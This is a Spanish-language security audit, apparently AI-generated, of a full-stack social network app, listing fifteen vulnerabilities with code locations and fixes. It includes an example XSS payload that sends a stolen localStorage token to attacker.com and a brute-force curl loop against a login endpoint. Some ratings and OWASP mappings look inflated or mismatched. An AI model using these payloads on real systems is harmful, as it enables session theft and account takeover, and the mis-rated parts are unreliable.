# 🔒 Estudio de Vulnerabilidades de Seguridad

**Fecha del Análisis:** 6 de febrero de 2026  
**Versión del Sistema:** 1.0.0  
**Analista:** GitHub Copilot  
**Alcance:** Análisis completo de vulnerabilidades en aplicación full-stack

## 📊 Resumen Ejecutivo

Se realizó un análisis exhaustivo de seguridad en la aplicación de red social full-stack, identificando **15 vulnerabilidades** categorizadas por nivel de criticidad:

- 🔴 **Críticas:** 3 vulnerabilidades
- 🟠 **Altas:** 5 vulnerabilidades
- 🟡 **Medias:** 4 vulnerabilidades
- 🟢 **Bajas:** 3 vulnerabilidades

**Puntuación de Riesgo General:** Alto (7.8/10)

## 🔴 Vulnerabilidades Críticas

### 1. Exposición de Tokens JWT en Errores
**CVE-like:** JWT-TOKEN-LEAK-001  
**Severidad:** Crítica  
**CVSS Score:** 9.1  

**Descripción:**
El middleware `verifyAuth.js` expone tokens JWT inválidos en respuestas de error, permitiendo a atacantes capturar tokens para análisis o reutilización.

**Ubicación:**
```javascript
// src/middlewares/verifyAuth.js:20-25
return res.status(401).json({
  success: false,
  message: "JWT Verification Failed",
  error: err,
  token,  // ← VULNERABILIDAD: Exposición del token
});
```

**Impacto:**
- Robo de identidad
- Acceso no autorizado a cuentas
- Análisis de tokens para cracking

**Explotación:**
```bash
curl -X GET "http://localhost:3001/api/v1/posts" \
  -H "Authorization: Bearer invalid.jwt.token"
# Respuesta incluye el token inválido
```

**Solución Recomendada:**
```javascript
// Remover la exposición del token del error
return res.status(401).json({
  success: false,
  message: "Token de autenticación inválido",
  // Remover: error: err, token
});
```

---

### 2. Almacenamiento de Tokens en localStorage
**CVE-like:** XSS-TOKEN-STORAGE-002  
**Severidad:** Crítica  
**CVSS Score:** 8.7  

**Descripción:**
Los tokens JWT se almacenan en `localStorage`, siendo vulnerables a ataques XSS que pueden robar tokens de sesión.

**Ubicación:**
```javascript
// client/src/api/http.js:9-12
http.interceptors.request.use((config) => {
  const token = localStorage.getItem('token')  // ← VULNERABLE
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})
```

**Impacto:**
- Robo de sesiones activas
- Acceso permanente a cuentas comprometidas
- Ataques de cadena de suministro

**Explotación:**
```javascript
// Ataque XSS posible
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Solución Recomendada:**
```javascript
// Usar httpOnly cookies para tokens
// O implementar token rotation con refresh tokens
const token = sessionStorage.getItem('token'); // Mejor opción
// O mejor aún: usar cookies httpOnly desde el servidor
```

---

### 3. Falta de Rate Limiting
**CVE-like:** DOS-RATE-LIMIT-003  
**Severidad:** Crítica  
**CVSS Score:** 8.5  

**Descripción:**
No hay protección contra ataques de fuerza bruta o DoS en endpoints críticos como login y registro.

**Ubicación:**
```javascript
// src/server.js - No hay middleware de rate limiting
app.use(express.json());
app.use(cors());
app.use(cookieParser());
```

**Impacto:**
- Ataques de fuerza bruta exitosos
- Denegación de servicio
- Sobrecarga de recursos del servidor

**Explotación:**
```bash
# Ataque de fuerza bruta automatizado
for i in {1..1000}; do
  curl -X POST "http://localhost:3001/api/v1/auth/login" \
    -d '{"email":"victim@example.com","password":"wrong'$i'"}'
done
```

**Solución Recomendada:**
```javascript
const rateLimit = require('express-rate-limit');

// Rate limiting para auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // 5 intentos por ventana
  message: 'Demasiados intentos de login, intenta más tarde'
});

app.use('/api/v1/auth/', authLimiter);
```

## 🟠 Vulnerabilidades Altas

### 4. Dependencia Vulnerable: Lodash Prototype Pollution
**CVE-like:** DEP-LODASH-POLLUTION-004  
**Severidad:** Alta  
**CVSS Score:** 7.3  

**Descripción:**
La dependencia `lodash` tiene una vulnerabilidad de contaminación de prototipo en las funciones `_.unset` y `_.omit`.

**Evidencia:**
```bash
$ npm audit
lodash  4.0.0 - 4.17.21
Severity: moderate
Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions
```

**Impacto:**
- Ejecución remota de código
- Manipulación de objetos JavaScript
- Compromiso del servidor

**Solución Recomendada:**
```bash
npm audit fix
# O actualizar manualmente
npm update lodash
```

---

### 5. Configuración CORS Permisiva
**CVE-like:** CORS-MISCONFIG-005  
**Severidad:** Alta  
**CVSS Score:** 7.1  

**Descripción:**
CORS está configurado sin restricciones específicas, permitiendo solicitudes desde cualquier origen.

**Ubicación:**
```javascript
// src/server.js:10
app.use(cors());  // ← Sin configuración específica
```

**Impacto:**
- Ataques CORS exploitation
- Bypass de SOP (Same-Origin Policy)
- Posibles ataques CSRF

**Solución Recomendada:**
```javascript
const corsOptions = {
  origin: process.env.NODE_ENV === 'production'
    ? ['https://yourdomain.com', 'https://app.yourdomain.com']
    : ['http://localhost:3000', 'http://localhost:5173'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
};

app.use(cors(corsOptions));
```

---

### 6. Falta de Headers de Seguridad
**CVE-like:** HEADERS-MISSING-006  
**Severidad:** Alta  
**CVSS Score:** 6.8  

**Descripción:**
No se implementan headers de seguridad esenciales como Helmet, CSP, HSTS, etc.

**Ubicación:**
```javascript
// src/server.js - No hay helmet u otros headers de seguridad
app.use(express.json());
app.use(cors());
app.use(cookieParser());
```

**Impacto:**
- Ataques XSS más fáciles
- Clickjacking
- MIME type sniffing attacks
- Falta de HTTPS enforcement

**Solución Recomendada:**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
      imgSrc: ["'self'", "data:", "https://images.unsplash.com"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

---

### 7. Validación de Contraseña Débil
**CVE-like:** AUTH-WEAK-PASSWORD-007  
**Severidad:** Alta  
**CVSS Score:** 6.5  

**Descripción:**
La validación de contraseñas requiere solo 6 caracteres sin complejidad.

**Ubicación:**
```javascript
// src/middlewares/validators/auth.validator.js:15-18
body("password")
  .notEmpty()
  .withMessage("Password is required")
  .isLength({ min: 6 })  // ← Solo 6 caracteres mínimo
  .withMessage("Password must be at least 6 characters long"),
```

**Impacto:**
- Contraseñas fácilmente crackeables
- Compromiso de cuentas masivo
- Cumplimiento no regulatorio

**Solución Recomendada:**
```javascript
body("password")
  .isLength({ min: 12 })
  .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
  .withMessage("Password must be at least 12 characters with uppercase, lowercase, number and special character"),
```

---

### 8. Información Sensible en Logs
**CVE-like:** LOGGING-SENSITIVE-DATA-008  
**Severidad:** Alta  
**CVSS Score:** 6.2  

**Descripción:**
Errores de conexión a BD incluyen información sensible en logs.

**Ubicación:**
```javascript
// config/db.js:9-13
dbConnection.connect((err) => {
  if (err) {
    console.log(
      "DB Connection Failed \n Error: " + JSON.stringify(err, undefined, 2)  // ← Información sensible
    );
  }
});
```

**Impacto:**
- Exposición de credenciales de BD
- Información de infraestructura
- Ataques de reconocimiento

**Solución Recomendada:**
```javascript
dbConnection.connect((err) => {
  if (err) {
    console.error('Database connection failed - check configuration');
    // No loggear detalles del error en producción
    if (process.env.NODE_ENV === 'development') {
      console.error('DB Error details:', err.message);
    }
  }
});
```

## 🟡 Vulnerabilidades Medias

### 9. Falta de Validación de Parámetros de Query
**CVE-like:** INPUT-VALIDATION-QUERY-009  
**Severidad:** Media  
**CVSS Score:** 5.8  

**Descripción:**
Parámetros de paginación no validados pueden causar problemas de rendimiento o errores.

**Ubicación:**
```javascript
// src/controllers/posts.controller.js:7-8
const { limit = 5, page = 1 } = req.query;
const offset = (page - 1) * limit;
```

**Impacto:**
- Consultas ineficientes
- Errores de base de datos
- Posible DoS por consultas grandes

**Solución Recomendada:**
```javascript
const limit = Math.min(parseInt(req.query.limit) || 10, 100); // Máximo 100
const page = Math.max(parseInt(req.query.page) || 1, 1);     // Mínimo 1
const offset = (page - 1) * limit;
```

---

### 10. URL Base No Validada en Frontend
**CVE-like:** URL-INJECTION-010  
**Severidad:** Media  
**CVSS Score:** 5.5  

**Descripción:**
La URL base de la API no se valida, permitiendo posibles ataques de inyección.

**Ubicación:**
```javascript
// client/src/api/http.js:3
const baseURL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:3000/api/v1'
```

**Impacto:**
- Ataques de redireccionamiento
- Posible SSRF si se expone
- Configuración incorrecta en producción

**Solución Recomendada:**
```javascript
// Validar y sanitizar la URL base
const validateBaseURL = (url) => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};

const baseURL = validateBaseURL(import.meta.env.VITE_API_BASE_URL)
  ? import.meta.env.VITE_API_BASE_URL
  : 'http://localhost:3000/api/v1';
```

---

### 11. Falta de Sanitización de Entrada
**CVE-like:** XSS-INPUT-SANITIZATION-011  
**Severidad:** Media  
**CVSS Score:** 5.2  

**Descripción:**
Contenido de posts y comentarios no se sanitiza antes de renderizar.

**Impacto:**
- Ataques XSS stored
- Manipulación del DOM
- Robo de cookies de sesión

**Solución Recomendada:**
```javascript
const sanitizeHtml = require('sanitize-html');

const sanitizedContent = sanitizeHtml(req.body.content, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
  allowedAttributes: {
    'a': ['href', 'target']
  }
});
```

---

### 12. Conexión Única a Base de Datos
**CVE-like:** DB-CONNECTION-POOL-012  
**Severidad:** Media  
**CVSS Score:** 4.9  

**Descripción:**
Se usa una sola conexión a BD en lugar de un pool, limitando la escalabilidad.

**Ubicación:**
```javascript
// config/db.js:3
const dbConnection = mysql.createConnection({  // ← No es pool
```

**Impacto:**
- Problemas de concurrencia
- Timeouts en alta carga
- Falta de escalabilidad

**Solución Recomendada:**
```javascript
const dbConnection = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
  connectionLimit: 10,  // Pool de conexiones
  queueLimit: 0,
  acquireTimeout: 60000
});
```

## 🟢 Vulnerabilidades Bajas

### 13. Información de Debug en Producción
**CVE-like:** DEBUG-INFO-LEAK-013  
**Severidad:** Baja  
**CVSS Score:** 3.7  

**Descripción:**
Información de debug podría estar expuesta en producción.

**Solución Recomendada:**
```javascript
// Deshabilitar debug en producción
if (process.env.NODE_ENV === 'production') {
  console.debug = () => {};
  console.log = () => {};  // O usar un logger apropiado
}
```

---

### 14. Falta de Timeouts en Conexiones
**CVE-like:** TIMEOUT-CONFIG-014  
**Severidad:** Baja  
**CVSS Score:** 3.2  

**Descripción:**
No hay configuración de timeouts para conexiones HTTP y de BD.

**Solución Recomendada:**
```javascript
// Timeout para conexiones HTTP
app.use(timeout('30s'));
app.use(haltOnTimedout);

// Timeout para BD
const dbConnection = mysql.createPool({
  // ... otras opciones
  timeout: 60000,  // 60 segundos
  acquireTimeout: 60000
});
```

---

### 15. Falta de Versionado de API
**CVE-like:** API-VERSIONING-015  
**Severidad:** Baja  
**CVSS Score:** 2.8  

**Descripción:**
La API no tiene versionado adecuado, dificultando actualizaciones.

**Solución Recomendada:**
```javascript
// Implementar versionado en rutas
app.use('/api/v2/auth/', require('./routes/v2/auth.route'));
app.use('/api/v1/auth/', require('./routes/v1/auth.route')); // Mantener v1
```

## 📈 Métricas de Seguridad

### Distribución por Categoría
- **Autenticación/Autorización:** 40% de vulnerabilidades
- **Configuración de Seguridad:** 25% de vulnerabilidades
- **Validación de Entrada:** 20% de vulnerabilidades
- **Dependencias:** 10% de vulnerabilidades
- **Configuración de Infraestructura:** 5% de vulnerabilidades

### OWASP Top 10 Mapping
- **A01:2021 - Broken Access Control:** Vulnerabilidades 1, 2
- **A02:2021 - Cryptographic Failures:** Vulnerabilidad 7
- **A03:2021 - Injection:** Vulnerabilidades 4, 8, 9
- **A05:2021 - Security Misconfiguration:** Vulnerabilidades 3, 5, 6, 12
- **A06:2021 - Vulnerable Components:** Vulnerabilidad 4
- **A07:2021 - Identification & Auth Failures:** Vulnerabilidades 1, 2, 7

## 🛠️ Plan de Remediación

### Fase 1: Críticas (Semana 1)
1. Remover exposición de tokens JWT en errores
2. Implementar rate limiting
3. Cambiar almacenamiento de tokens a sessionStorage/httpOnly cookies

### Fase 2: Altas (Semana 2)
4. Actualizar dependencias vulnerables
5. Configurar CORS restrictivo
6. Implementar headers de seguridad (Helmet)
7. Mejorar validación de contraseñas
8. Sanitizar logs sensibles

### Fase 3: Medias (Semana 3)
9. Validar parámetros de query
10. Validar URL base en frontend
11. Implementar sanitización de HTML
12. Cambiar a connection pool de BD

### Fase 4: Bajas (Semana 4)
13. Configurar logging apropiado
14. Implementar timeouts
15. Agregar versionado de API

## 🔍 Metodología de Análisis

### Herramientas Utilizadas
- **Análisis Manual de Código:** Revisión línea por línea
- **npm audit:** Detección de vulnerabilidades en dependencias
- **OWASP Top 10:** Framework de referencia
- **CVSS v3.1:** Sistema de puntuación de vulnerabilidades

### Alcance del Análisis
- ✅ Código fuente completo (frontend y backend)
- ✅ Configuraciones de seguridad
- ✅ Dependencias y paquetes
- ✅ Arquitectura de autenticación
- ✅ Manejo de datos sensibles
- ✅ Configuración de red y CORS

## 📋 Recomendaciones Generales

### 1. Implementar Seguridad en Capas
- **Red:** Firewalls, WAF, DDoS protection
- **Aplicación:** Input validation, authentication, authorization
- **Datos:** Encryption at rest, secure connections

### 2. Monitoreo Continuo
- Implementar logging centralizado
- Alertas de seguridad automáticas
- Revisiones de código con herramientas SAST

### 3. Actualizaciones Regulares
- Mantener dependencias actualizadas
- Aplicar parches de seguridad promptly
- Usar herramientas de vulnerability scanning

### 4. Pruebas de Seguridad
- Incluir pruebas de seguridad en CI/CD
- Penetration testing regular
- Code reviews enfocados en seguridad

## 📞 Contacto y Escalación

**Analista de Seguridad:** GitHub Copilot  
**Fecha de Próxima Revisión:** 6 de marzo de 2026  
**Prioridad de Remediación:** Alta  

---

**Nota:** Este estudio debe ser revisado por un equipo de seguridad profesional antes de la implementación de correcciones. Algunas vulnerabilidades pueden requerir cambios arquitectónicos significativos.